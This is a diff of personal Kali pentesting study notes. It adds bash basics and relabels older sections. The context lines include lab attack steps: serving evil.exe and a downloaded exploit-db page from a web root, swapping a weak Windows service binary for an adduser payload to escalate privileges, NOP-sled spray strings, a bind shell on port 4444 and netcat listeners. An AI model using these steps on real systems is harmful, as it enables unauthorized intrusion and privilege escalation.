@@ -1,6 +1,57 @@
 Pentesting with Kali
 
 
+v2 Notes
+
+# Environment Variables
+
+echo $PATH
+echo $USER                                             Current user
+echo $HOME                                             Home directory
+echo $PWD                                              Present working directory
+
+export t=10.0.0.10                                     Set the target IP as a variable
+nmap $t
+
+env                                                    Environment variables
+------------------------------------------------------------------------------------------------------
+
+# Bash
+
+history                                                List commands that have been entered into the shell
+!<command number>                                      Re-run a specific command
+!802                                                   Re-run command 802
+
+$HISTSIZE                                              Controls the number of commands stored for the current session
+$HISTFILESIZE                                          How many command are kept in the .bash_history file
+
+<up arrow>                                             Scrolls back in history
+<down arrow>                                           Scrolls forward in history
+<ctrl+r>  <letter>                                     Reverse i search facility
+------------------------------------------------------------------------------------------------------
+
+standard input (STDIN) - 0                             Data fed into the program
+standard output (STDOUT) - 1                           Output from the program (deafult to terminal)
+standard error (STDERR) -2                             Error messages (defaults to terminal)
+
+ping google.com > tmp                                  Redirect output to a new file
+ping target.com >> tmp                                 Appending output to an existing file
+wc -m < tmp                                            Redirect STDIN from a file
+
+cat tmp | wc -m                                        Piping the output of the first command into the second command
+------------------------------------------------------------------------------------------------------
+
+# Text Searching & Manipulation
+
+grep, sed, cut awk                                     See discover/notes/bash.sh
+head
+wc -l
+wc -m
+------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------
+
+v1 Notes
+
 # Netcat
 
 Kali              192.168.2.10
@@ -127,7 +178,7 @@ cp /tmp/evil.exe /var/www/                             Copy the exploit to the w
 
 # Weak Services - Windows
 
-Windows
+- Windows
 Install vuln app
 services.msc
 Find the service > RC > Properties
@@ -135,7 +186,7 @@ Note the path to executable
 cd to that directory
 icacls vulnapp.exe                                     Misconfigured if the Everyone group has access
 
-Kali
+- Kali
 cat adduser.c
 #include <stdlib.h>
 int main ()
@@ -149,7 +200,7 @@ i586-mingw32msvc-gcc adduser.c -o adduser.exe          Cross compile code
 file adduser.exe
 mv adduser.exe /var/www/
 
-Windows
+- Windows
 Open IE to <kali-ip>/adduser.exe
 move vulnapp.exe vulnapp.exe-old
 copy c:\users\lee\Downloads\adduser.exe vulnapp.exe
@@ -160,7 +211,7 @@ Restart vulnapp
 The account with Users privs should how have Admin privs
 ------------------------------------------------------------------------------------------------------
 
-# Weak Services - Linux
+# Weak Services
 
 find / -perm -2 ! -type l -ls 2>/dev/null              Search for WORLD writable files. 
 
@@ -182,11 +233,11 @@ wget -O exploit.html http://www.exploit-db.com/download/24017
 mv exploit.html /var/www/
 service apache2 start
 
-Windows
+- Windows
 Open IE to <kali-ip>/exploit.html
 netstat -an:find “4444”                                Look for a bind shell
 
-Kali
+- Kali
 nc -v <target-IP> 4444
 ------------------------------------------------------------------------------------------------------
 
@@ -199,6 +250,6 @@ Copy over the new buffer, then add 28 nops.
 %u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090
 nc -lvp 443
 
-Windows
-Open IE to <kali-ip>/exploit.html
+- Windows
+Open IE to <attacker IP>/exploit.html
 
